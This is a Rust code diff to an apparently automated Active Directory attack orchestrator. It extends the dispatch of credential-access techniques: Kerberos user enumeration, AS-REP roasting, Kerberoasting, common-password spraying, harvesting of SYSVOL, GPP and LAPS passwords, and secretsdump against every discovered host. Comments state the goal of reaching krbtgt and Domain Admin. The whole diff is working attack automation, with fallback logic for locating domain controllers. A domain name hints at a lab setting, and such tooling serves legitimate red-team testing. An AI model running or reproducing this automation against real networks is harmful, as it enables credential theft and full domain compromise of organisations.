@@ -38,7 +38,12 @@ pub async fn auto_credential_access(
                 .iter()
                 .filter(|d| !state.is_processed(DEDUP_ASREP_DOMAINS, d))
                 .filter_map(|domain| {
-                    let dc_ip = state.domain_controllers.get(domain).cloned()?;
+                    // Try DC map first, then fall back to target_ips[0]
+                    let dc_ip = state
+                        .domain_controllers
+                        .get(domain)
+                        .cloned()
+                        .or_else(|| state.target_ips.first().cloned())?;
                     Some((domain.clone(), dc_ip))
                 })
                 .collect()
@@ -47,7 +52,7 @@ pub async fn auto_credential_access(
         for (domain, dc_ip) in asrep_work {
             let payload = json!({
                 "techniques": ["kerberos_user_enum_noauth", "asrep_roast", "username_as_password"],
-                "dc_ip": dc_ip,
+                "target_ip": dc_ip,
                 "domain": domain,
             });
 
@@ -73,38 +78,57 @@ pub async fn auto_credential_access(
         }
 
         // --- Kerberoast: one per domain + credential pair ---
-        let kerberoast_work: Vec<(String, String, ares_core::models::Credential)> = {
+        let kerberoast_work: Vec<(String, String, String, ares_core::models::Credential)> = {
             let state = dispatcher.state.read().await;
             state
                 .credentials
                 .iter()
                 .filter(|c| !c.domain.is_empty())
                 .filter_map(|cred| {
-                    let dedup = format!(
-                        "krb:{}:{}",
-                        cred.domain.to_lowercase(),
-                        cred.username.to_lowercase()
-                    );
+                    let cred_domain = cred.domain.to_lowercase();
+                    let dedup = format!("krb:{}:{}", cred_domain, cred.username.to_lowercase());
                     if state.is_processed(DEDUP_CRACK_REQUESTS, &dedup) {
                         return None;
                     }
-                    let dc_ip = state
-                        .domain_controllers
-                        .get(&cred.domain.to_lowercase())
-                        .cloned()?;
-                    Some((dedup, dc_ip, cred.clone()))
+                    // Exact domain match first
+                    if let Some(dc_ip) = state.domain_controllers.get(&cred_domain).cloned() {
+                        return Some((dedup, dc_ip, cred_domain, cred.clone()));
+                    }
+                    // Fallback: check child domains (e.g. cred has "sevenkingdoms.local"
+                    // but user is actually in "north.sevenkingdoms.local")
+                    let suffix = format!(".{cred_domain}");
+                    for (domain, dc_ip) in &state.domain_controllers {
+                        if domain.ends_with(&suffix) {
+                            debug!(
+                                cred_domain = %cred_domain,
+                                child_domain = %domain,
+                                "Kerberoast: using child domain DC for parent-domain credential"
+                            );
+                            return Some((dedup, dc_ip.clone(), domain.clone(), cred.clone()));
+                        }
+                    }
+                    // Last resort: use target_ips[0] if DC map has no entry for this domain
+                    if let Some(fallback_ip) = state.target_ips.first().cloned() {
+                        debug!(
+                            cred_domain = %cred_domain,
+                            fallback_ip = %fallback_ip,
+                            "Kerberoast: using target IP fallback (no DC in map)"
+                        );
+                        return Some((dedup, fallback_ip, cred_domain, cred.clone()));
+                    }
+                    None
                 })
                 .take(2)
                 .collect()
         };
 
-        for (dedup_key, dc_ip, cred) in kerberoast_work {
+        for (dedup_key, dc_ip, resolved_domain, cred) in kerberoast_work {
             match dispatcher
-                .request_credential_access("kerberoast", &dc_ip, &cred.domain, &cred, 5)
+                .request_credential_access("kerberoast", &dc_ip, &resolved_domain, &cred, 5)
                 .await
             {
                 Ok(Some(task_id)) => {
-                    debug!(task_id = %task_id, domain = %cred.domain, "Kerberoast dispatched");
+                    debug!(task_id = %task_id, domain = %resolved_domain, "Kerberoast dispatched");
                     dispatcher
                         .state
                         .write()
@@ -128,15 +152,24 @@ pub async fn auto_credential_access(
                 .iter()
                 .filter(|u| !u.domain.is_empty())
                 .filter_map(|u| {
-                    let dedup =
-                        format!("{}:{}", u.domain.to_lowercase(), u.username.to_lowercase());
+                    let user_domain = u.domain.to_lowercase();
+                    let dedup = format!("{}:{}", user_domain, u.username.to_lowercase());
                     if state.is_processed(DEDUP_USERNAME_SPRAY, &dedup) {
                         return None;
                     }
+                    // Exact match or child-domain fallback
                     let dc_ip = state
                         .domain_controllers
-                        .get(&u.domain.to_lowercase())
-                        .cloned()?;
+                        .get(&user_domain)
+                        .cloned()
+                        .or_else(|| {
+                            let suffix = format!(".{user_domain}");
+                            state
+                                .domain_controllers
+                                .iter()
+                                .find(|(d, _)| d.ends_with(&suffix))
+                                .map(|(_, ip)| ip.clone())
+                        })?;
                     Some((dedup, dc_ip, u.domain.clone()))
                 })
                 .take(5)
@@ -180,6 +213,188 @@ pub async fn auto_credential_access(
                 }
                 Ok(None) => {}
                 Err(e) => warn!(err = %e, "Failed to dispatch password spray"),
+            }
+        }
+
+        // --- Low-hanging fruit: SYSVOL, GPP, LDAP descriptions, LAPS per new credential ---
+        // Mirrors Python's fast credential discovery — dispatches high-success-rate
+        // techniques that find hardcoded/stored passwords in Active Directory.
+        let low_hanging_work: Vec<(String, String, ares_core::models::Credential)> = {
+            let state = dispatcher.state.read().await;
+            state
+                .credentials
+                .iter()
+                .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
+                .filter_map(|cred| {
+                    let cred_domain = cred.domain.to_lowercase();
+                    let dedup = format!("{}:{}", cred_domain, cred.username.to_lowercase());
+                    if state.is_processed(DEDUP_LOW_HANGING, &dedup) {
+                        return None;
+                    }
+                    // Find DC for this credential's domain
+                    let dc_ip = state
+                        .domain_controllers
+                        .get(&cred_domain)
+                        .cloned()
+                        .or_else(|| {
+                            let suffix = format!(".{cred_domain}");
+                            state
+                                .domain_controllers
+                                .iter()
+                                .find(|(d, _)| d.ends_with(&suffix))
+                                .map(|(_, ip)| ip.clone())
+                        })
+                        .or_else(|| state.target_ips.first().cloned())?;
+                    Some((dedup, dc_ip, cred.clone()))
+                })
+                .take(2) // Max 2 per cycle
+                .collect()
+        };
+
+        for (dedup_key, dc_ip, cred) in low_hanging_work {
+            match dispatcher
+                .request_low_hanging_fruit(&dc_ip, &cred.domain, &cred, 4)
+                .await
+            {
+                Ok(Some(task_id)) => {
+                    info!(
+                        task_id = %task_id,
+                        domain = %cred.domain,
+                        username = %cred.username,
+                        "Low-hanging fruit credential discovery dispatched"
+                    );
+                    dispatcher
+                        .state
+                        .write()
+                        .await
+                        .mark_processed(DEDUP_LOW_HANGING, dedup_key.clone());
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_LOW_HANGING, &dedup_key)
+                        .await;
+                }
+                Ok(None) => {}
+                Err(e) => warn!(err = %e, "Failed to dispatch low-hanging fruit"),
+            }
+        }
+
+        // --- Secretsdump per new credential against ALL hosts ---
+        // Mirrors Python: dispatches secretsdump for EVERY new credential against
+        // ALL discovered hosts (not just DCs). Credentials may be local admin on
+        // member servers. Secretsdump will fail fast if the cred lacks admin rights,
+        // but when it succeeds it's the fastest path to krbtgt and DA.
+        let sd_work: Vec<(String, String, ares_core::models::Credential)> = {
+            let state = dispatcher.state.read().await;
+
+            // Skip if already DA
+            if state.has_domain_admin {
+                Vec::new()
+            } else {
+                let mut items = Vec::new();
+                for cred in state
+                    .credentials
+                    .iter()
+                    .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
+                {
+                    let cred_domain = cred.domain.to_lowercase();
+                    // Target all hosts, not just DCs — credential may be local admin
+                    for host in &state.hosts {
+                        let dedup = format!(
+                            "{}:{}:{}",
+                            host.ip,
+                            cred_domain,
+                            cred.username.to_lowercase()
+                        );
+                        // Use unified DEDUP_SECRETSDUMP (not separate DEDUP_CRED_SECRETSDUMP)
+                        if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
+                            items.push((dedup, host.ip.clone(), cred.clone()));
+                        }
+                    }
+                }
+                items.into_iter().take(5).collect() // Max 5 per cycle
+            }
+        };
+
+        for (dedup_key, target_ip, cred) in sd_work {
+            let priority = if cred.is_admin { 2 } else { 5 };
+            match dispatcher
+                .request_secretsdump(&target_ip, &cred, priority)
+                .await
+            {
+                Ok(Some(task_id)) => {
+                    info!(
+                        task_id = %task_id,
+                        target = %target_ip,
+                        username = %cred.username,
+                        "Credential secretsdump dispatched"
+                    );
+                    dispatcher
+                        .state
+                        .write()
+                        .await
+                        .mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
+                        .await;
+                }
+                Ok(None) => {}
+                Err(e) => warn!(err = %e, "Failed to dispatch credential secretsdump"),
+            }
+        }
+
+        // --- Common password spray: per domain when users exist but no creds yet ---
+        // Mirrors Python's password_spray dispatch — doesn't wait for stall detection.
+        let common_spray_work: Vec<(String, String)> = {
+            let state = dispatcher.state.read().await;
+            if state.credentials.len() > 1 || state.has_domain_admin {
+                // Already have creds beyond initial — skip common spray
+                Vec::new()
+            } else {
+                state
+                    .domain_controllers
+                    .iter()
+                    .filter(|(domain, _)| {
+                        let key = format!("common:{}", domain.to_lowercase());
+                        !state.is_processed(DEDUP_PASSWORD_SPRAY, &key)
+                            && state
+                                .users
+                                .iter()
+                                .any(|u| u.domain.to_lowercase() == **domain)
+                    })
+                    .map(|(domain, dc_ip)| (domain.clone(), dc_ip.clone()))
+                    .collect()
+            }
+        };
+
+        for (domain, dc_ip) in common_spray_work {
+            let payload = json!({
+                "techniques": ["password_spray", "username_as_password"],
+                "reason": "low_hanging_fruit",
+                "target_ip": dc_ip,
+                "domain": domain,
+                "use_common_passwords": true,
+            });
+
+            match dispatcher
+                .throttled_submit("credential_access", "credential_access", payload, 6)
+                .await
+            {
+                Ok(Some(task_id)) => {
+                    info!(task_id = %task_id, domain = %domain, "Common password spray dispatched");
+                    let key = format!("common:{}", domain.to_lowercase());
+                    dispatcher
+                        .state
+                        .write()
+                        .await
+                        .mark_processed(DEDUP_PASSWORD_SPRAY, key.clone());
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_PASSWORD_SPRAY, &key)
+                        .await;
+                }
+                Ok(None) => {}
+                Err(e) => warn!(err = %e, "Failed to dispatch common password spray"),
             }
         }
     }
